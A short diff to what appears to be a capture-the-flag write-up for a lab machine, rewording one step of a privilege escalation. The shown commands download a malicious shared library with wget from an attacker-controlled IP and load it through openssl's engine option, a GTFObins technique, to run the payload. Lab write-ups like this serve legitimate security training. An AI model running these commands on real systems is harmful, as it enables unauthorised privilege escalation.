@@ -118,7 +118,7 @@ Uploaded the file to the machine using wget,
 ```bash
 wget http://10.9.12.192/test.so
 ``` 
-Executed the following command from GTFObins to make the bash binary a SUID binary.
+Executed the following command from GTFObins to run my payload.
 ```
 openssl req -engine /home/mindgames/test.so
 ```
